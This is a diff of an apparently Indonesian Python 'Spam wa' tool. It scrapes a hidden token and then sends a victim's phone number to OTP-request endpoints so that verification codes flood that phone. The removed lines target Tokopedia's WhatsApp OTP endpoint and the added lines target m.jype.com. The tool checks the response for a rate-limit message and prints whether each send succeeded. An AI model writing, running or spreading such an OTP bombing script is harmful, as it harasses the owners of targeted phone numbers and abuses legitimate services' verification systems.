@@ -30,9 +30,10 @@ def banner():
   ___) | |_) | (_| | | | | | |   \ V  V / (_| |
  |____/| .__/ \__,_|_| |_| |_|    \_/\_/ \__,_|
        |_|                                     
-                   '''+W+'Creator : ./OZEEBLACK\n\t\t   ISENGCUMACOPY')
+                   '''+W+'Creator : OZEEBLACK\n\t\t   ISENG CUMA COPY')
                    
 def main():
+	os.system('clear')
 	banner()
 	print('')
 	print('')
@@ -50,7 +51,7 @@ def main():
 	'Accept-Encoding' : 'gzip, deflate',
 	}
 			
-	site = requests.get('https://m.jype.com//?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
+	site = requests.get('https://m.jype.com/', headers = headers).text
 	search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
 			
 	data = {
@@ -65,7 +66,7 @@ def main():
 	}
 			
 	try:
-		send = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = headers, data = data)
+		send = requests.post('https://m.jype.com/', headers = headers, data = data)
 		if 'Anda sudah melakukan 3 kali pengiriman kode' in send.text:
 			print('')
 			print(''+C+'Pengiriman'+A+' Gagal !')
